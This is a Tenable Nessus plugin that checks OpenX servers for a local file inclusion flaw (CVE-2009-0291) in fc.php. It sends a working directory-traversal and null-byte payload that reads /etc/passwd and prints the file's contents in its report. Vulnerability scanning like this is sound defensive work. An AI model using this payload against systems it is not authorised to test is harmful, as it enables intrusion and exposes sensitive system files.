#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(35557);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2009-0291");
  script_bugtraq_id(33458);
  script_xref(name:"milw0rm", value:"7883");
  script_xref(name:"Secunia", value:"32197");
  script_xref(name:"OSVDB", value:"52167");

  script_name(english:"OpenX fc.php MAX_type Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running OpenX (formerly Openads), an open source ad
serving application written in PHP. 

The installed version of OpenX does not validate user-supplied input
to the 'MAX_type' parameter of the 'www/delivery/fc.php' script before
using it in a PHP 'include()' function.  Regardless of PHP's
'register_globals' setting, an unauthenticated attacker can exploit
this issue to view arbitrary files or possibly to execute arbitrary
PHP code on the remote host, subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2009-4/" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500408/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500411/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"https://developer.openx.org/jira/browse/OX-4817" );
 script_set_attribute(attribute:"see_also", value:"http://www.openx.org/docs/2.6/release-notes/openx-2.6.4" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500568/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to OpenX version 2.6.4 / 2.4.10 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Try to retrieve a local file.
file = '/etc/passwd';
file_pat = "root:.*:0:[01]:";
traversal = crap(data:"../", length:3*9) + '..';


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/openx", "/openads", "/ads", "/adserver", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to read a local file.
  varname = "MAX_type";
  tagname = traversal + file;
  url = string(
    dir, "/www/delivery/fc.php?",
    varname, "=", tagname, "%00"
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # Did someone change $MAX_PLUGINS_AD_PLUGIN_NAME?
  if (string(varname, " is not specified") >< res[2])
  {
    varname = res[2] - strstr(res[2], " is not specified");
    url = string(
      dir, "/www/delivery/fc.php?",
      varname, "=", tagname, "%00"
    );

    res = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(res)) exit(0);
  }

  # There's a problem if...
  if (
    # there's something in the response body and...
    strlen(res[2]) &&
    (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:res[2]) ||
      # magic_quotes_gpc was enabled or...
      string("/plugins/invocationTags/", tagname, "\\0/", tagname, '\\0.delivery.php"') >< res[2] ||
      # the file doesn't exist or open_basedir limits access to it
      string("/plugins/invocationTags/", tagname, "\x00/", tagname, '\x00.delivery.php"') >< res[2]
    )
  )
  {
    # Unless we're paranoid, make sure we're looking at the affected script.
    if (report_paranoia < 2 && "Invocation plugin delivery file" >!< res[2])
    {
      url2 = string(dir, "/www/delivery/fc.php");

      res2 = http_send_recv3(method:"GET", item:url2, port:port);
      if (!isnull(res2) && string(varname, " is not specified") >!< res2[2])
      {
        debug_print("'", build_url(port:port, qs:url2), "' is exploitable, but the script doesn't appear to be from OpenX / Openads!", level:0);
        continue;
      }
    }

    # Make sure it's not 2.6.4 with magic_quotes enabled and 
    # conf[debug][production] disabled.
    if (string(tagname, '\\0') >< res[2])
    {
      url2 = string(dir, "/www/admin/numberFormat.js.php?lang=en/../it");

      res2 = http_send_recv3(method:"GET", item:url2, port:port);
      if (!isnull(res2) && "var tdelimiter = ','" >< res2[2]) continue;
    }

    if (report_verbosity > 0)
    {
      if (egrep(pattern:file_pat, string:res[2]))
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2],
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else
      {
        report = string(
          "\n",
          "Nessus was able to verify the issue exists using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n",
          "\n",
          "Note that, although the remote install is affected by this\n",
          "vulnerability, Nessus was not able to retrieve the contents of\n",
          "'", file, "', perhaps because the file does not exist on the\n",
          "target, PHP's 'open_basedir' setting limits access to it, or PHP's\n",
          "'magic_quotes_gpc' setting is enabled.\n"
        );
      }
    }
    else security_hole(port);

    exit(0);
  }
}
